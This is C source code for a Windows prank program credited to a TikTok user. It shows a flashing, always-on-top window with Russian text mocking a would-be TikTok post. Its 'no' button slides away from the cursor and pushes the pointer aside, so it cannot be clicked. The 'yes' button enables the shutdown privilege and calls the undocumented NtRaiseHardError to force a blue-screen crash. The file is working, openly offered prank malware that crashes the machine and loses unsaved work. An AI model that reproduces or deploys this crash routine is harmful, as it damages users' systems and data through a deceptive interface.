/*
            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
                    Version 2, December 2004

    Copyright (C) 2024 haloperidozz (TikTok: @haloperidozz)

    Everyone is permitted to copy and distribute verbatim or modified
    copies of this license document, and changing it is allowed as long
    as the name is changed.

            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
    TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

    0. You just DO WHAT THE FUCK YOU WANT TO.
*/

#include <windows.h>
#include <ntdef.h>
#include <tchar.h>

#define MAIN_WINDOW_CLASS       TEXT("TikTok: @haloperidozz")
#define MAIN_WINDOW_CAPTION     MAIN_WINDOW_CLASS

#define MAIN_WINDOW_WIDTH       720
#define MAIN_WINDOW_HEIGHT      500

#define CONTENT_HEADER          TEXT("ТРЕВОГА!")
#define CONTENT_TEXT                                                    \
    TEXT("Наши службы обнаружили, что вы собираетесь опубликовать ")    \
    TEXT("очередной щитпост в TikTok, содержащий слова поддержки ")     \
    TEXT("к MAP аудитории. Вы подтверждаете свои намерения?")

#define AGREE_BUTTON_TEXT       TEXT("ДА")
#define FAKE_BUTTON_TEXT        TEXT("НЕТ, БЛЯТЬ")

#define COLOR_RED               RGB(255, 0, 0)
#define COLOR_WHITE             RGB(255, 255, 255)
#define COLOR_BLACK             RGB(0, 0, 0)

#define SE_SHUTDOWN_PRIVILEGE   19L

#define IDT_BLINK_TIMER         100
#define ID_AGREE_BUTTON         101
#define ID_FAKE_BUTTON          102

#define UM_FAKE_BTN_MOUSEMOVE   (WM_USER + 1)

typedef struct tagMAINWINDOW {
    BOOL bBlinkState;
    HBRUSH hbrRedBrush;
    HBRUSH hbrWhiteBrush;
    HFONT hHeaderFont;
    HFONT hTextFont;
    HWND hFakeButton;
    WNDPROC hOldFakeButtonProc;
    HWND hAgreeButton;
    HWND hHeaderStatic;
    HWND hTextStatic;
    HWND hWnd;
} MAINWINDOW, *PMAINWINDOW;

/* https://gitlab.winehq.org/wine/wine/-/blob/master/include/winternl.h */
typedef enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, *PHARDERROR_RESPONSE_OPTION;

/* https://gitlab.winehq.org/wine/wine/-/blob/master/include/winternl.h */
typedef enum _HARDERROR_RESPONSE {
    ResponseReturnToCaller,
    ResponseNotHandled,
    ResponseAbort,
    ResponseCancel,
    ResponseIgnore,
    ResponseNo,
    ResponseOk,
    ResponseRetry,
    ResponseYes
} HARDERROR_RESPONSE, *PHARDERROR_RESPONSE;

/* https://gitlab.winehq.org/wine/wine/-/blob/master/include/winternl.h */
typedef NTSTATUS (WINAPI *RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN,
                                                PBOOLEAN);

/* https://gitlab.winehq.org/wine/wine/-/blob/master/include/winternl.h */
typedef NTSTATUS (WINAPI *NtRaiseHardError_t)(NTSTATUS, ULONG, ULONG,
                                              PVOID*,
                                              HARDERROR_RESPONSE_OPTION,
                                              PHARDERROR_RESPONSE);

static VOID ErrorMessage(LPCTSTR lpszMessage, ...)
{
    TCHAR szBuffer[4096];
    va_list args;

    va_start(args, lpszMessage);

    _vsntprintf_s(szBuffer, sizeof(szBuffer) / sizeof(TCHAR), _TRUNCATE,
                  lpszMessage, args);

    va_end(args);

    MessageBox(NULL, szBuffer, TEXT("Error"), MB_ICONERROR | MB_OK);
}

static HMODULE GetNtDllHandle(VOID)
{
    HMODULE hNtDll = GetModuleHandle(TEXT("ntdll.dll"));

    if (hNtDll == NULL) {
        ErrorMessage(TEXT("Failed to load ntdll.dll"));
        return NULL;
    }

    return hNtDll;
}

static NTSTATUS WINAPI RtlAdjustPrivilege(ULONG uPrivilege, BOOLEAN bEnable,
                                          BOOLEAN bCurrentThread,
                                          PBOOLEAN pbEnabled)
{
    FARPROC fpFuncAddress;
    
    fpFuncAddress = GetProcAddress(GetNtDllHandle(), "RtlAdjustPrivilege");

    if (fpFuncAddress == NULL) {
        ErrorMessage(TEXT("Failed to locate RtlAdjustPrivilege"));
        return STATUS_DLL_INIT_FAILED;
    }

    return ((RtlAdjustPrivilege_t) fpFuncAddress)(uPrivilege, bEnable,
                                                  bCurrentThread, pbEnabled);
}

static NTSTATUS WINAPI NtRaiseHardError(NTSTATUS ntErrorStatus,
                                        ULONG uNumberOfParameters,
                                        ULONG uUnicodeStringParameterMask,
                                        PVOID *ppParameters,
                                        HARDERROR_RESPONSE_OPTION options,
                                        PHARDERROR_RESPONSE pResponse)
{
    FARPROC fpFuncAddress;
    
    fpFuncAddress = GetProcAddress(GetNtDllHandle(), "NtRaiseHardError");

    if (fpFuncAddress == NULL) {
        ErrorMessage(TEXT("Failed to locate NtRaiseHardError"));
        return STATUS_DLL_INIT_FAILED;
    }

    return ((NtRaiseHardError_t) fpFuncAddress)(ntErrorStatus,
                                                uNumberOfParameters,
                                                uUnicodeStringParameterMask,
                                                ppParameters, options,
                                                pResponse);
}

static VOID BlueScreen(NTSTATUS ntErrorStatus)
{
    BOOLEAN bEnabled = FALSE;
    HARDERROR_RESPONSE response = 0;
    NTSTATUS status;

    status = RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

    if (!NT_SUCCESS(status)) {
        ErrorMessage(TEXT("Failed to adjust privilege. Status: 0x%X\n"),
                     status);
        return;
    }

    status = NtRaiseHardError(ntErrorStatus, 0, 0, NULL, OptionShutdownSystem,
                              &response);

    if (!NT_SUCCESS(status)) {
        ErrorMessage(TEXT("Failed to raise hard error. Status: 0x%X\n"),
                     status);
        return;
    }
}

/* HACK: */
static LRESULT CALLBACK FakeButtonSubProcedure(HWND hWnd, UINT uMsg,
                                               WPARAM wParam,
                                               LPARAM lParam)
{
    HWND hParentWnd = GetParent(hWnd);
    PMAINWINDOW pMainWnd = NULL;
    WNDPROC hOldProc = NULL;

    pMainWnd = (PMAINWINDOW) GetWindowLongPtr(hParentWnd, GWLP_USERDATA);

    if (pMainWnd == NULL) {
        return 0;
    }
    
    hOldProc = pMainWnd->hOldFakeButtonProc;

    if (uMsg == WM_MOUSEMOVE) {
        PostMessage(hParentWnd, UM_FAKE_BTN_MOUSEMOVE, wParam, lParam);
    }

    if (uMsg >= 0x00F0 && uMsg <= 0x00F8 || uMsg == WM_SETFOCUS) {
        return 0;
    }

    return CallWindowProc(hOldProc, hWnd, uMsg, wParam, lParam);
}

static VOID MainWindow_OnCreate(PMAINWINDOW pMainWnd)
{
    pMainWnd->hbrRedBrush = CreateSolidBrush(COLOR_RED);
    pMainWnd->hbrWhiteBrush = (HBRUSH) GetStockObject(WHITE_BRUSH);

    pMainWnd->hHeaderFont = CreateFont(120, 0, 0, 0, FW_NORMAL, FALSE,
                                       FALSE, FALSE, DEFAULT_CHARSET,
                                       OUT_DEFAULT_PRECIS,
                                       CLIP_DEFAULT_PRECIS,
                                       DEFAULT_QUALITY,
                                       DEFAULT_PITCH | FF_SWISS,
                                       TEXT("Comic Sans MS"));

    pMainWnd->hTextFont = CreateFont(36, 0, 0, 0, FW_NORMAL, FALSE,
                                     FALSE, FALSE, DEFAULT_CHARSET,
                                     OUT_DEFAULT_PRECIS,
                                     CLIP_DEFAULT_PRECIS,
                                     DEFAULT_QUALITY,
                                     DEFAULT_PITCH | FF_SWISS,
                                     TEXT("Comic Sans MS"));
    
    pMainWnd->hHeaderStatic = CreateWindow(TEXT("STATIC"), CONTENT_HEADER,
            WS_CHILD | WS_VISIBLE | SS_NOTIFY | SS_CENTER,
            0, 20, MAIN_WINDOW_WIDTH, 100,
            pMainWnd->hWnd, NULL, NULL, NULL);
    
    SendMessage(pMainWnd->hHeaderStatic, WM_SETFONT,
                (WPARAM) pMainWnd->hHeaderFont, TRUE);
    
    pMainWnd->hTextStatic = CreateWindow(TEXT("STATIC"), CONTENT_TEXT,
            WS_CHILD | WS_VISIBLE | SS_NOTIFY | SS_CENTER,
            40, 140, MAIN_WINDOW_WIDTH - 80, 150,
            pMainWnd->hWnd, NULL, NULL, NULL);
    
    SendMessage(pMainWnd->hTextStatic, WM_SETFONT,
                (WPARAM) pMainWnd->hTextFont, TRUE);
    
    pMainWnd->hAgreeButton = CreateWindow(TEXT("BUTTON"), AGREE_BUTTON_TEXT,
            WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
            120, 340, 150, 50,
            pMainWnd->hWnd, (HMENU) ID_AGREE_BUTTON, NULL, NULL);
    
    pMainWnd->hFakeButton = CreateWindow(TEXT("BUTTON"), FAKE_BUTTON_TEXT,
            WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON | WS_CLIPSIBLINGS,
            MAIN_WINDOW_WIDTH - 150 - 120, 340, 150, 50,
            pMainWnd->hWnd, (HMENU) ID_FAKE_BUTTON, NULL, NULL);
    
    pMainWnd->hOldFakeButtonProc = (WNDPROC) SetWindowLongPtr(
            pMainWnd->hFakeButton, GWLP_WNDPROC,
            (LONG_PTR) FakeButtonSubProcedure);

    SetTimer(pMainWnd->hWnd, IDT_BLINK_TIMER, 250, NULL);
}

static VOID MainWindow_HandleMouseMoveForFakeButton(PMAINWINDOW pMainWnd)
{
    RECT rcButton, rcWindow, rcDist;
    POINT ptCursor, ptOffset = {0, 0};
    int iButtonWidth, iButtonHeight;

    GetCursorPos(&ptCursor);
    ScreenToClient(pMainWnd->hWnd, &ptCursor);

    GetWindowRect(pMainWnd->hFakeButton, &rcButton);
    MapWindowPoints(HWND_DESKTOP, pMainWnd->hWnd, (LPPOINT)&rcButton, 2);
    GetClientRect(pMainWnd->hWnd, &rcWindow);

    rcDist.left = ptCursor.x - rcButton.left;
    rcDist.right = rcButton.right - ptCursor.x;
    rcDist.top = ptCursor.y - rcButton.top;
    rcDist.bottom = rcButton.bottom - ptCursor.y;

    if (min(rcDist.left, rcDist.right) < min(rcDist.top, rcDist.bottom)) {
        ptOffset.x = (rcDist.left < rcDist.right) ? 5 : -5;
    } else {
        ptOffset.y = (rcDist.top < rcDist.bottom) ? 5 : -5;
    }

    iButtonWidth = rcButton.right - rcButton.left;
    iButtonHeight = rcButton.bottom - rcButton.top;

    rcButton.left = max(rcWindow.left,
            min(rcButton.left + ptOffset.x, rcWindow.right - iButtonWidth));
    
    rcButton.top = max(rcWindow.top,
            min(rcButton.top + ptOffset.y, rcWindow.bottom - iButtonHeight));

    SetWindowPos(pMainWnd->hFakeButton, NULL, rcButton.left, rcButton.top,
                 0, 0, SWP_NOSIZE);
    
    /**********************************************************************
     * Cursor
     **********************************************************************/

    if (PtInRect(&rcButton, ptCursor) == FALSE) {
        return;
    }

    if (ptOffset.x != 0) {
        ptCursor.x = (ptOffset.x > 0) ? rcButton.left - 1 : rcButton.right + 1;
    } else if (ptOffset.y != 0) {
        ptCursor.y = (ptOffset.y > 0) ? rcButton.top - 1 : rcButton.bottom + 1;
    }

    ClientToScreen(pMainWnd->hWnd, &ptCursor);
    SetCursorPos(ptCursor.x, ptCursor.y);
}

static VOID MainWindow_OnPaint(PMAINWINDOW pMainWnd)
{
    PAINTSTRUCT ps = {0};
    HDC hDC = BeginPaint(pMainWnd->hWnd, &ps);

    if (pMainWnd->bBlinkState) {
        FillRect(hDC, &ps.rcPaint, pMainWnd->hbrWhiteBrush);
    } else {
        FillRect(hDC, &ps.rcPaint, pMainWnd->hbrRedBrush);
    }

    EndPaint(pMainWnd->hWnd, &ps);
}

static HBRUSH MainWindow_OnStaticColor(PMAINWINDOW pMainWnd, HWND hCtrl,
                                       HDC hDC)
{
    BOOL bBlink = pMainWnd->bBlinkState;

    SetBkMode(hDC, TRANSPARENT);

    if (hCtrl == pMainWnd->hHeaderStatic) {
        SetTextColor(hDC, bBlink ? COLOR_RED : COLOR_WHITE);
    }

    /* HACK: */
    return bBlink ? pMainWnd->hbrWhiteBrush : pMainWnd->hbrRedBrush;
}

static VOID MainWindow_OnCommand(PMAINWINDOW pMainWnd, WPARAM wParam)
{
    if (wParam == ID_AGREE_BUTTON) {
#if 1
        BlueScreen(STATUS_ASSERTION_FAILURE);
#else
        ErrorMessage(TEXT("DEBUG: Blue Screen of Death"));
#endif
    }
}

static VOID MainWindow_OnTimer(PMAINWINDOW pMainWnd, WPARAM wParam)
{
    if (wParam == IDT_BLINK_TIMER) {
        pMainWnd->bBlinkState = !(pMainWnd->bBlinkState);
        InvalidateRect(pMainWnd->hWnd, NULL, TRUE);
    }
}

static VOID MainWindow_OnDestroy(PMAINWINDOW pMainWnd)
{
    DeleteObject(pMainWnd->hbrRedBrush);
    DeleteObject(pMainWnd->hHeaderFont);
    DeleteObject(pMainWnd->hTextFont);
}

static LRESULT CALLBACK MainWindowProcedure(HWND hWnd, UINT uMsg,
                                            WPARAM wParam,
                                            LPARAM lParam)
{
    PMAINWINDOW pMainWnd = NULL;

    if (uMsg == WM_CREATE) {
        pMainWnd = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                             sizeof *pMainWnd);
        
        if (pMainWnd == NULL) {
            ErrorMessage(TEXT("Failed to allocate memory for pMainWnd"));
            PostQuitMessage(0);
            return 0;
        }

        pMainWnd->hWnd = hWnd;
        
        MainWindow_OnCreate(pMainWnd);

        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR) pMainWnd);
    } else {
        pMainWnd = (PMAINWINDOW) GetWindowLongPtr(hWnd, GWLP_USERDATA);
    }

    switch (uMsg) {
        case WM_COMMAND:
            MainWindow_OnCommand(pMainWnd, wParam);
            break;

        case WM_PAINT:
            MainWindow_OnPaint(pMainWnd);
            break;

        case UM_FAKE_BTN_MOUSEMOVE:
            MainWindow_HandleMouseMoveForFakeButton(pMainWnd);
            break;
        
        case WM_CTLCOLORSTATIC: {
            return (LRESULT) MainWindow_OnStaticColor(pMainWnd,
                                                      (HWND) lParam,
                                                      (HDC) wParam);
        }

        case WM_TIMER:
            MainWindow_OnTimer(pMainWnd, wParam);
            break;

        case WM_DESTROY:
            MainWindow_OnDestroy(pMainWnd);
            HeapFree(GetProcessHeap(), 0, pMainWnd);
            PostQuitMessage(0);
            break;
    }

    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

static ATOM RegisterMainWindowClass(HINSTANCE hInstance)
{
    WNDCLASSEX wClass = {
        .cbSize         = sizeof(wClass),
        .cbWndExtra     = sizeof(MAINWINDOW),
        .lpfnWndProc    = &MainWindowProcedure,
        .hInstance      = hInstance,
        .lpszClassName  = MAIN_WINDOW_CLASS,
        .hCursor        = LoadCursor(NULL, IDC_ARROW),
    };

    return RegisterClassEx(&wClass);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    HWND hWnd;
    MSG msg;

    if (RegisterMainWindowClass(hInstance) == 0) {
        ErrorMessage(TEXT("Failed to register window class"));
        return 0;
    }

    hWnd = CreateWindowEx(WS_EX_COMPOSITED | WS_EX_TOPMOST,
                          MAIN_WINDOW_CLASS, MAIN_WINDOW_CAPTION,
                          WS_OVERLAPPED | WS_CAPTION | WS_CLIPCHILDREN,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          MAIN_WINDOW_WIDTH, MAIN_WINDOW_HEIGHT,
                          NULL, NULL, hInstance, NULL);

    if (hWnd == NULL) {
        ErrorMessage(TEXT("Failed to create window class"));
        return 0;
    }

    ShowWindow(hWnd, nCmdShow);

    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int) msg.wParam;
}